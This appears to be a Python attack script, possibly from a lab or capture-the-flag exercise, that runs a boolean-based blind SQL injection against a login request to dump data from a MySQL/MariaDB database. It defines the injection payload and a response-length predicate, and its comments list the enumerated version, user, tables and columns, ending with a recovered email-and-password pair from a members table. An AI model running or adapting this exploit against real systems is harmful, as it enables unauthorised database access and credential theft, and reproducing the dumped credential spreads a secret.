import yasqlit as ya

def pPayload(p):
    sqli = f'9 or ({p})=1'
    return sqli

def boolPredicate(res):
    if len(res.text) > 3000:
        return True
    else:
        return False

def pwn():
    t = ya.Transport(payloadProcessor=pPayload, predicate=boolPredicate, requestPath='req.login')

    dbms = 'mysql'
    # qry = ya.templates[dbms]['select']['version']
    # 10.0.23-MariaDB
    # qry = ya.templates[dbms]['select']['user']
    # root@localhost
    # qry = ya.templates[dbms]['select']['database']
    # seattle
    # ya.boolExfiltrate(t, qry, dbms)
    # qry = ya.templates[dbms]['select']['tables']
    # ['tblBlogs', 'tblMembers', 'tblProducts']
    # qry = ya.templates[dbms]['select']['columns'].replace('{table}', 'tblMembers')
    # ['id', 'username', 'password', 'session', 'name', 'blog', 'admin']
    qry = 'SELECT password from tblMembers'
    # admin@seattlesounds.net:Assasin1

    res = ya.boolExfiltrateList(t, qry, dbms)
    print(res)


pwn()